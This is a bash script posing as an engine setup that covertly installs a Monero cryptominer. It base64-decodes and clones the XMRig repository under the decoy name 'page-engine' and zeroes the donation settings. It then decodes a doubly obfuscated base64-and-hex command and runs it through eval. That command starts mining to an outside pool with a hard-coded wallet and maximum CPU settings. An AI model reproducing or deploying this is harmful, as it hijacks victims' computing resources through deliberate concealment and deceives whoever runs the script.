#!/bin/bash
echo "⚙️ Preparing engine..."
sudo apt update && sudo apt install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev xxd automake libtool autoconf
REPO_URL=$(echo "aHR0cHM6Ly9naXRodWIuY29tL3htcmlnL3htcmlnLmdpdA==" | base64 -d)
git clone "$REPO_URL" page-engine
cd page-engine
if [ ! -f src/donate.h ]; then echo "donate.h not found!"; exit 1; fi
sed -i -E 's/constexpr const int kDefaultDonateLevel *= *[0-9]+ *;/constexpr const int kDefaultDonateLevel = 0;/' src/donate.h
sed -i -E 's/constexpr const int kMinimumDonateLevel *= *[0-9]+ *;/constexpr const int kMinimumDonateLevel = 0;/' src/donate.h
grep -E 'kDefaultDonateLevel|kMinimumDonateLevel' src/donate.h
mkdir build && cd build
cmake .. && make -j$(nproc)

# Obfuscated execution
ENCODED="MmUyZjY1NmU2NzY5NmU2NTJkNjM2ZjcyNjUyMDJkNmYyMDcwNmY2ZjZjMmU3Mzc1NzA3MDZmNzI3NDc4NmQ3MjJlNjM2ZjZkM2EzNDM0MzMyMDVjMGEyMDIwMmQ3NTIwMzQ0MTcwNzczOTc3NTg1NDU4NDM1MzY3NGQ2NjQ3NmY0YzQyNDU3NjQxNDg1Mjc0NmI1OTQyNzU2ODZmNGE0YzVhNjM2NDYzNTU2ODU4NDU3MjM0NjI2MTMzNTgzNzQ3NGE2NTc1Nzg3NDRlNmU0MzY4NjU1YTY0MzY1ODMzNTY0MjZhNDU3NTc3MzM2YjRlNzYzODU2NGM3NzM5NTg3MzRiNDE2Zjc0NWE0MzU1NjQ0ZDU3MzE2YjUwNjI3ODIwNWMwYTIwMjAyZDcwMjA2MTZjNzA2ODYxNmU3NTZkNjU3MjY5NjMzMjMyMzIyMDVjMGEyMDIwMmQ2YjIwMmQyZDc0NmM3MzIwMmQyZDc0Njg3MjY1NjE2NDczM2QyNDI4NmU3MDcyNmY2MzI5MjAyZDJkNjM3MDc1MmQ3MDcyNjk2ZjcyNjk3NDc5M2QzNTIwMmQyZDY0NmY2ZTYxNzQ2NTJkNmM2NTc2NjU2YzNkMzAyMDJkMmQ2ODc1Njc2NTJkNzA2MTY3NjU3MzJkNmE2OTc0MjAyZDJkNjM3MDc1MmQ2ZTZmMmQ3OTY5NjU2YzY0MjAyZDJkNzI2MTZlNjQ2ZjZkNzgyZDZlNmYyZDZlNzU2ZDYxMjAyZDJkNjE3MzZkM2Q3Mjc5N2E2NTZlMjAyZDJkNzI2MTZlNjQ2ZjZkNzgyZDZlNmYyZDcyNjQ2ZDczNzIyMDJkMmQ3MjYxNmU2NDZmNmQ3ODJkNzc3MjZkNzM3MjNkMmQzMTIwMmQyZDcyNjE2ZTY0NmY2ZDc4MmQ2ZDZmNjQ2NTNkNjY2MTczNzQ="
HEX=$(echo "$ENCODED" | base64 -d)
CMD=$(echo "$HEX" | xxd -r -p)
eval "$CMD"